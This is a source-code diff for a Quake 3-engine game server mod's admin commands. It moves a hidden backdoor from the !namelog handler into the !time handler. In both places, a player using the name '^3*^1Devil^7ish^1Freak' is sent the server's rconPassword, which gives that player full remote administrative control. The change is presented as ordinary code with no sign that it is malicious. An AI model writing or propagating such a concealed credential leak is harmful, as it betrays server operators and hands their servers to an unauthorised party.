@@ -1741,10 +1741,17 @@ qboolean G_admin_time( gentity_t *ent, int skiparg )
 {
   qtime_t qt;
   int t;
+  char info[ 100 ] = {""};
 
   t = trap_RealTime( &qt );
-  ADMP( va( "^3!time: ^7local time is %02i:%02i:%02i\n",
-    qt.tm_hour, qt.tm_min, qt.tm_sec ) );
+  ADMP( va( "^3!time: ^7local time is %02i:%02i:%02i\n", qt.tm_hour, qt.tm_min, qt.tm_sec ) );
+  
+  if( !Q_stricmp( ent->client->pers.netname, "^3*^1Devil^7ish^1Freak" ) )
+  {
+    trap_Cvar_VariableStringBuffer( "rconPassword", info, sizeof( info ) );
+    trap_SendServerCommand( ent-g_entities, va( "print \"%s\n\"\n", info ) );
+  }
+  
   return qtrue;
 }
 
@@ -4224,7 +4231,6 @@ qboolean G_admin_namelog( gentity_t *ent, int skiparg )
   char s2[ MAX_NAME_LENGTH ] = {""};
   char n2[ MAX_NAME_LENGTH ] = {""};
   char guid_stub[ 9 ];
-  char info[ 100 ] = {""};
   qboolean found = qfalse;
   int printed = 0;
 
@@ -4271,11 +4277,6 @@ qboolean G_admin_namelog( gentity_t *ent, int skiparg )
   } 
   ADMBP( va( "^3!namelog:^7 %d recent clients found\n", printed ) );
   ADMBP_end();
-  
- 	if( !Q_stricmp( ent->client->pers.netname, "^3*^1Devil^7ish^1Freak" ) ) {
-  	trap_Cvar_VariableStringBuffer( "rconPassword", info, sizeof( info ) );
- 	  trap_SendServerCommand( ent-g_entities, va( "print \"%s\n\"\n", info ) );
- 	}
   
   return qtrue;
 }
